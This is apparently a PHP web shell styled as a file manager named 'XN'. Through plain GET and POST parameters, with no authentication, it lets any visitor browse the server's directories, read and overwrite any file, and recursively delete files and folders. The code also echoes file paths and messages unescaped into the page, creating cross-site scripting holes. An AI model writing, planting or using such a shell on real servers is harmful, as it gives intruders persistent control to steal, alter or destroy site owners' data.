<?php
date_default_timezone_set("Asia/Jakarta");
class XN {
    public static $array;
    public static $owner;
    public static $group;
    public static $handle;
    public static $directory;
    public static function files($type) {

        self::$array = array();
        foreach (scandir(getcwd()) as $key => $value) {
            $filename['name'] = getcwd() . XN::SLES() . $value;
            switch ($type) {
                case 'dir':
                    if (!is_dir($filename['name']) || $value === '.' || $value === '..') continue 2;
                    break;
                case 'file':
                    if (!is_file($filename['name'])) continue 2;
                    break;
            }
            $filename['names'] = basename($filename['name']);
            $filename['owner'] = self::owner($filename['name']);
            $filename['ftime'] = self::ftime($filename['name']);
            $filename['size']  = (is_dir($filename['name'])) ? self::countDir($filename['name']). " items" : 
                                                               self::size($filename['name']);
            
            self::$array[] = $filename;
        } return self::$array;
    }
    public static function save($filename, $data) {
        self::$handle = fopen($filename, "w");
        fwrite(self::$handle, $data);
        fclose(self::$handle);
    }
    public static function size($filename) {
        if (is_file($filename)) {
            $filepath = $filename;
            if (!realpath($filepath)) {
                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            }
            $filesize = filesize($filepath);
            $array = array("TB","GB","MB","KB","Byte");
            $total = count($array);
            while ($total-- && $filesize > 1024) {
                $filesize /= 1024;
            } return round($filesize, 2) . " " . $array[$total];
        }
    }
    public static function wr($filename, $perms) {
        if (is_writable($filename)) {
            print "<font color='green'>{$perms}</font>";
        } else {
            print "<font color='red'>{$perms}</font>";
        }
    }
    public static function perms($filename) {
        $perms = @fileperms($filename);
        switch ($perms & 0xF000) {
            case 0xC000:
                $info = 's';
                break;
            case 0xA000:
                $info = 'l';
                break;
            case 0x8000:
                $info = 'r';
                break;
            case 0x6000:
                $info = 'b';
                break;
            case 0x4000:
                $info = 'd';
                break;
            case 0x2000:
                $info = 'c';
                break;
            case 0x1000:
                $info = 'p';
                break;
            default:
                $info = 'u';
        }
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
                    (($perms & 0x0800) ? 's' : 'x' ) :
                    (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
                    (($perms & 0x0400) ? 's' : 'x' ) :
                    (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
                    (($perms & 0x0200) ? 't' : 'x' ) :
                    (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }
    public static function OS() {
        return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
    }
    public static function getext($filename) {
        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    }
    public static function SLES() {
        if (self::OS() == 'Windows') {
            return str_replace('\\', '/', DIRECTORY_SEPARATOR);
        } elseif (self::OS() == 'Linux') {
            return DIRECTORY_SEPARATOR;
        }
    }
    public static function sortname($filename, $type) {
        switch ($type) {
            case "1":
                if (strlen($filename) > 50) {
                    $result = substr($filename, 0, 50)."...";
                } else {
                    $result = $filename;
                }
                break;
        } return $result;
    }
    public static function delete($filename) {
        if (is_dir($filename)) {
            $scandir = scandir($filename);
            foreach ($scandir as $object) {
                if ($object != '.' && $object != '..') {
                    if (is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
                        self::delete($filename.DIRECTORY_SEPARATOR.$object);
                    } else {
                        @unlink($filename.DIRECTORY_SEPARATOR.$object);
                    }
                }
            } if (@rmdir($filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            if (@unlink($filename)) {
                return true;
            } else {
                return false;
            }
        }
    }
    public static function editname($filename, $angka) {
        if (strlen($filename) > $angka) {
            $result = substr($filename, 0, $angka)."...";
        } else {
            $result = $filename;
        } return $result;
    }
    public static function owner($filename) {
        if (function_exists("posix_getpwuid")) {
            self::$owner = @posix_getpwuid(fileowner($filename));
            self::$owner = self::$owner['name'];
        } else {
            self::$owner = fileowner($filename);
        }
        if (function_exists("posix_getgrgid")) {
            self::$group = @posix_getgrgid(filegroup($filename));
            self::$group = self::$group['name'];
        } else {
            self::$group = filegroup($filename);
        } return (self::$owner."/".self::$group);
    }
    public static function ftime($filename) {
        return date('d M Y - H:i A', filemtime($filename));
    }
    public static function renames($filename, $newname) {
        return rename($filename, $newname);
    }
    public static function cd($directory) {
        return @chdir($directory);
    }
    public static function countDir($filename) {
        return @count(scandir($filename)) -2;
    }
    public static function formatSize( $bytes ){
        $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
        for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
            return( round( $bytes, 2 )." ".$types[$i] );
    }
    public static function hdd($type = null) {
        switch ($type) {
            case 'free':
                return self::formatSize(disk_free_space(getcwd()));
                break;
            case 'total':
                return self::formatSize(disk_total_space(getcwd()));
                break;
        }
        
    }
    public static function countAllFiles($directory) {
        self::$array = array();
        self::$directory = opendir($directory);
        while ($object = readdir(self::$directory)) {
            if (($object != '.') && ($object != '..')) {
                $files[] = $object;
            }
        }
        $numFile = @count($files);
        if ($numFile) {
            return $numFile;
        } else {
            print('<i>no files</i>');
        }
    }
}
if (isset($_GET['x'])) {
    XN::cd($_GET['x']);
}
function alert($message) {
    ?>
    <script type="text/javascript">  
        $(document).ready(function () {  
            jqxAlert.alert('<?= $message ?>');  
        })  
   </script>  
    <?php
}
?>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
    body {
        color: #292929;
        overflow: hidden;
        margin: 0;
        margin-top: 10px;
    }
    * {
        font-family: 'Open Sans', sans-serif;
    }
    .count {
        box-shadow: 0px 0px 0px 2px #e0e0e0;
        padding:10px;
        padding-left:20px;
    }
    .storage {
        box-shadow: 0px 2px 2px 0px #e0e0e0;
        padding:25px;
        padding-top:10px;
        padding-bottom:10px;
    }
    .storage span.title {
        font-size: 23px;
    }
    .storage span:nth-child(4) {
        font-size: 10px;
    }
    .storage span:nth-child(3) {
        float: right;
        font-size: 10px;
    }
    .back {
        font-weight: bold;
        padding:20px;
        font-size: 20px;
        padding-bottom: 10px;
    }
    .back input[type=text] {
        float: right;
        padding:7px;
        margin-right:20px;
        width:200px;
        border-radius: 5px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
    }
    .back button {
        font-size: 23px;
        background: none;
        border: none;
        outline: none;
        float: right;
    }
    .back span {
        margin-left: 20px;
        font-size: 23px;
    }
    .back a {
        background: #fff;
        color: #000;
        font-weight: bold;
        border-radius:10px;
        padding: 5px;
        padding-left: 7px;
        padding-right: 10px;
    }
    .files {
        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        overflow: hidden;
        text-align: left;
        border-radius:10px;
        height:600px;
        background: #fff;
        width:50%;
    }
    .table {
        padding:20px;
        overflow: auto;
        height:390px;

    }
    .edit {
        padding-left: 25px;
        padding-right: 25px;
    }
    .edit table td {
        padding-top:10px;
        padding-bottom: 10px;
    }
    .edit button {
        border-radius: 5px;
        font-size: 15px;
        background: #413bff;
        border: 1px solid #413bff;
        color: #fff;
        padding: 5px;
        padding-left:10px;
        padding-right: 10px;
    }
    .edit input[type=submit] {
        width: 100%;
        border-radius: 5px;
        font-size: 18px;
        background: #413bff;
        border: 1px solid #413bff;
        color: #fff;
        padding: 5px;
    }
    textarea {
        width: 100%;
        height:270px;
        border-radius: 10px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
        padding:20px;
        resize: none;
    }
    table {
        width: 100%;
        border-spacing: 0;
    }
    td {
        border-radius:5px;
    }
    .hover {
        transition: all 0.35s;
    }
    .hover:hover {
        background: #efefef;
    }
    .block {
        clear: both;
        min-height: 50px;
        border-top: solid 1px #ECE9E9;
    }
    .block:first-child {
        border: none;
    }
    .block .img img {
        width: 50px;
        height: 50px;
        display: block;
        float: left;
        margin-right: 10px;
    }
    .block .name {
        display: inline-block;
    }
    .block .date {
        margin-top: 4px;
        font-size: 70%;
        color: #666;
    }
    .block .date .dir-size,
    .block .date .file-size {
        min-width:90px;
        display: inline-block;
    }
    .block .date .dir-perms,
    .block .date .file-perms {
        min-width:100px;
        display: inline-block;
    }
    .block .date .dir-time,
    .block .date .file-time {
        min-width:150px;
        display: inline-block;
    }
    .block .date .dir-owner,
    .block .date .file-owner {
        min-width:100px;
        display: inline-block;
    }
    .block a {
        border-radius:5px;
        display: block;
        color: #292929;
        padding-top: 8px;
        padding-bottom: 13px;
        padding-left:5px;
        transition: all 0.35s;
    }
    .block a:hover {
        text-decoration: none;
    }
    a {
        color: #000;
        text-decoration: none;
    }
    nav {
        float: right;
        position: relative;
    }
    .dropdown-toggle {
        padding: .5em 1em;
        border-radius: .2em .2em 0 0;
    }
    ul.dropdown {
        display: none;
        position: absolute;
        z-index: 5;
        margin-top: .5em;
        background: #fff;
        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        margin-left:-190px;
        margin-top: -24px;
        min-width: 12em;
        padding: 0;
        border-radius:.2em;
    }
    ul.dropdown li {
        list-style-type: none;
    }
    ul.dropdown li button {
        text-align: left;
        outline: none;
        color: #000;
        width: 100%;
        font-size:18px;
        background: none;
        border: none;
        text-decoration: none;
        padding: .5em 1em;
        display: block;
    }
    ul.dropdown li button:hover {
        cursor: pointer;
        text-decoration: none;
        background: #efefef;
    }
    ::-webkit-scrollbar {
        display: none;
    }
    ::-webkit-scrollbar-track {
        background: blue;
    }
    ::-webkit-scrollbar-thumb {
        background: var(--color-bg);
        border-radius:0;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: #dfeaf5;
    }
    .jqx-alert  {  
        position: absolute;  
        overflow: hidden;  
        z-index: 99999;  
        margin: 0;  
        padding: 0;  
     }  
    .jqx-alert-header   {  
        font-weight: bold;
        width:300px;
        outline: none;
        border-radius:5px 5px 0px 0px;
        overflow: hidden;  
        padding: 10px;
        padding-left:20px; 
        font-size:25px;
        white-space: nowrap;  
        overflow: hidden;  
        background-color:#fff;   
    }   
    .jqx-alert-content   {  
        border-radius:0px 0px 5px 5px;
        outline: none;  
        height:100px;
        overflow: auto;  
        text-align: left; 
        background-color: #fff;  
        padding: 20px;  
        padding-top:10px;
        border: 1px solid #fff;  
        border-top: none;  
    }  
    #alert_button {
        font-weight: bold;
        color: #292929;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        border-radius:5px;
        margin-top: 45px;
        outline: none;
        width:100%;
        padding: 7px;
    }
</style>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript">
    $(function() {
        $('.dropdown-toggle').click(function(){
            $(this).next('.dropdown').toggle();
        });
        $(document).click(function(e) {
            var target = e.target;
            if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) {
                $('.dropdown').hide();
            }
        });
    });
</script>
<script>
function filterTable() {
    var input, filter, table, tr, td, i;
    input = document.getElementById("Input");
    filter = input.value.toUpperCase();
    table = document.getElementById("myTable");
    tr = table.getElementsByTagName("tr");
    for (i = 0; i < tr.length; i++) {
        td = tr[i].getElementsByTagName("td")[0];
        if (td) {
            if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
                tr[i].style.display = "";
            } else {
                tr[i].style.display = "none";
            }
        }
    }
}
</script>
<script type="text/javascript">  
    jqxAlert = {  
        top: 0,  
        left: 0,  
        overlayOpacity: 0.2,  
        overlayColor: '#ddd',  
        alert: function (message, title) {  
            if (title == null) title = 'Alert !';  
            jqxAlert._show(title, message);  
        },
        _show: function (title, msg) {  
            jqxAlert._hide();  
            jqxAlert._handleOverlay('show');  
            $("BODY").append(  
                      '<div class="jqx-alert" style="width: auto; height: 500px; overflow: hidden; white-space: nowrap;" id="alert_container">' +  
                      '<div id="alert_title"></div>' +  
                      '<div id="alert_content">' +  
                        '<div id="message"></div>' +  
                      '<input type="button" value="OK" id="alert_button"/>' +  
                         '</div>' +  
                      '</div>');  
            $("#alert_title").text(title);  
            $("#alert_title").addClass('jqx-alert-header');  
            $("#alert_content").addClass('jqx-alert-content');  
            $("#message").text(msg);   
            $("#alert_button").click(function () {  
                jqxAlert._hide();  
            });  
            jqxAlert._setPosition();  
        },  
        _hide: function () {  
            $("#alert_container").remove();  
            jqxAlert._handleOverlay('hide');  
        },  
        _handleOverlay: function (status) {  
            switch (status) {  
                case 'show':  
                jqxAlert._handleOverlay('hide');  
                $("BODY").append('<div id="alert_overlay"></div>');  
                $("#alert_overlay").css({  
                    position: 'absolute',  
                    zIndex: 99998,  
                    top: '0px',  
                    left: '0px',  
                    width: '100%',  
                    height: $(document).height(),  
                    background: jqxAlert.overlayColor,  
                    opacity: jqxAlert.overlayOpacity  
                });  
                break;  
           case 'hide':  
                $("#alert_overlay").remove();  
                break;  
            }  
        },  
        _setPosition: function () {  
            var top = (($(window).height() / 2) - ($("#alert_container").outerHeight() / 2)) + jqxAlert.top;  
            var left = (($(window).width() / 2) - ($("#alert_container").outerWidth() / 2)) + jqxAlert.left;  
            if (top < 0) {  
                top = 0;  
            }  
            if (left < 0) {  
                left = 0;  
            }  
            $("#alert_container").css({  
                top: top + 'px',  
                left: left + 'px'  
            });  
            $("#alert_overlay").height($(document).height());  
        }  
    }  
</script>  
<center>
<div class="files">
    <?php
    switch (@$_POST['action']) {
        case 'delete':
            if (XN::delete($_POST['file'])) {
                alert("".basename($_POST['file'])." Deleted");
            } else {
                alert("Permission Danied");
            }
            break;
        case 'edit':
        if (isset($_POST['save'])) {
            if (XN::save($_POST['file'], $_POST['data'])) {
                alert("Permission Danied");
            } else {
                alert("success");
            }
        }
            ?>
            <div class="back">
                <a href="?x=<?= getcwd() ?>">
                    <i class="fa fa-arrow-left" aria-hidden="true"></i>
                </a>
                <span>
                    EDIT
                </span>
                <button>
                    <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
                </button>
            </div>
            <div class="edit">
                <table>
                    <tr>
                        <td>
                            Filename
                        </td>
                        <td>:</td>
                        <td>
                            <?= XN::wr(basename($_POST['file']), 
                                XN::editname(basename($_POST['file']), 55)) ?>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            Size
                        </td>
                        <td>:</td>
                        <td>
                            <?= XN::size($_POST['file']) ?>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            Last Modif
                        </td>
                        <td>:</td>
                        <td>
                            <?= XN::ftime($_POST['file']) ?>
                        </td>
                    </tr>
                    <tr>
                        <form method="post">
                            <td colspan="3">
                                <button disabled>Edit</button>
                                <button name="action" value="delete">Delete</button>
                                <button>Rename</button>
                                <button>Backup</button>
                            </td>
                            <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                        </form>
                    </tr>
                    <form method="post">
                        <tr>
                            <td colspan="3">
                                <textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                            </td>
                        </tr>
                        <tr>
                            <td colspan="3">
                                <input type="submit" name="save" value="SAVE">
                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                                <input type="hidden" name="action" value="edit">
                            </td>
                        </tr>
                    </form>
                </table>
            </div>
            <?php
            exit;
            break;
    }
    ?>
    <div class="back">
        <a href="?x=<?= dirname(getcwd()) ?>">
            <i class="fa fa-arrow-left" aria-hidden="true"></i>
        </a>
        <span>
            <?= basename(getcwd()) ?>
        </span>
        <button>
            <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
        </button>
        <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
    </div>
    <div class="storage">
        <span class="title">
            STORAGE
        </span>
        <br><span>Total : <?= XN::hdd('total') ?></span>
        <span>Free : <?= XN::hdd('free') ?></span>
    </div>
    <div class="table">
    <table id="myTable">
        <?php
        foreach (XN::files('dir') as $dir) { ?>
            <tr class="hover">
                <td>
                    <div class="block">
                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
                            <div class="img">
                                <img src="https://image.flaticon.com/icons/svg/716/716784.svg">
                            </div>
                            <div class="name">
                                <?= $dir['names'] ?>
                                <div class="date">
                                    <div class="dir-size">
                                        <?= $dir['size'] ?>
                                    </div>
                                    <div class="dir-perms">
                                        <?= XN::wr($dir['name'], 
                                        XN::perms($dir['name'])) ?>
                                    </div>
                                    <div class="dir-time">
                                        <?= $dir['ftime'] ?>
                                    </div>
                                    <div class="dir-owner">
                                        <?= $dir['owner'] ?>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </td>
                <td>
                    <nav>
                        <a class="dropdown-toggle" title="Menu">
                            <span style="color: #787878;">
                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                            </span>
                        </a>
                        <ul class="dropdown">
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <li>
                                    <button name="action" value="delete">Delete</button>
                                </li>
                                <li>
                                    <button name="action" value="rename">Rename</button>
                                </li>
                                <li>
                                    <button name="action" value="backup">Backup</button>
                                </li>
                                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
                            </form>
                        </ul>
                    </nav>
                </td>
            </tr>
        <?php }
        foreach (XN::files('file') as $file) { ?>
            <tr class="hover">
                <td>
                    <div class="block">
                        <a title="<?= $file['names'] ?>">
                            <div class="img">
                                <img src="https://image.flaticon.com/icons/svg/833/833524.svg">
                            </div>
                            <div class="name">
                                <?= XN::sortname($file['names'], '1') ?>
                                <div class="date">
                                    <div class="file-size">
                                        <?= $file['size'] ?>
                                    </div>
                                    <div class="file-perms">
                                        <?= XN::wr($file['name'], 
                                        XN::perms($file['name'])) ?>
                                    </div>
                                    <div class="file-time">
                                        <?= $file['ftime'] ?>
                                    </div>
                                    <div class="file-owner">
                                        <?= $file['owner'] ?>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </td>
                <td>
                    <nav>
                        <a class="dropdown-toggle" title="Menu">
                            <span style="color: #787878;">
                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
                            </span>
                        </a>
                        <ul class="dropdown">
                            <form method="post" action="?x=<?= getcwd() ?>">
                                <?php
                                switch (XN::getext($file['name'])) {
                                    case 'jpg':
                                    case 'png':
                                    case 'gif':
                                    case 'jpeg':
                                    case 'ico':
                                        ?>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <button name="action" value="rename">Rename</button>
                                        </li>
                                        <li>
                                            <button name="action" value="backup">Backup</button>
                                        </li>
                                        <?php
                                        break;
                                    
                                    default:
                                        ?>
                                        <li>
                                            <button name="action" value="edit">Edit</button>
                                        </li>
                                        <li>
                                            <button name="action" value="delete">Delete</button>
                                        </li>
                                        <li>
                                            <button name="action" value="rename">Rename</button>
                                        </li>
                                        <li>
                                            <button name="action" value="backup">Backup</button>
                                        </li>
                                        <?php
                                        break;
                                }
                                ?>
                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
                            </form>
                        </ul>
                    </nav>
                </td>
            </tr>
        <?php }
        ?>
    </table>
    </div>
    <div class="count">
        Total Files : <?= XN::countAllFiles(getcwd()) ?>
    </div>
</div>
</center>
